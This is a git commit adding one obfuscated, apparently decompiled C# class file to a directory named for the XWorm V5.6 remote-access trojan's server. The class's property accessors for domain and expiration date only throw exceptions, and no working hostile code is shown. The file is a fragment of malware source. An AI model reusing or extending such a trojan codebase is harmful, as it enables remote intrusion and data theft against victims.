fe2c20c4561c0a47e4ac8dba2b1e4d6ac6ac6dfa
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:22 +0400

    Forms51.cs

---
+++ XWorm V5.6/Server/Forms/Forms51.cs
@@ -0,0 +1,26 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+
+namespace AB892649DCEFA60A6C98F59179B35916
+{
+  public class MBF622CC1C2FEBE494M27DB44DE5F45D
+  {
+    public static int LDB90LE46D84878LC6ELA6AC766ED8FE;
+    public static int EFD86DCE01DCCF659154F11E16B01B82;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_domain(string AutoPropertyValue) => throw new Exception("ぶ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public double get_expirationDate() => throw new Exception("ゅ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_expirationDate(double AutoPropertyValue) => throw new Exception("し");
+  }
+}
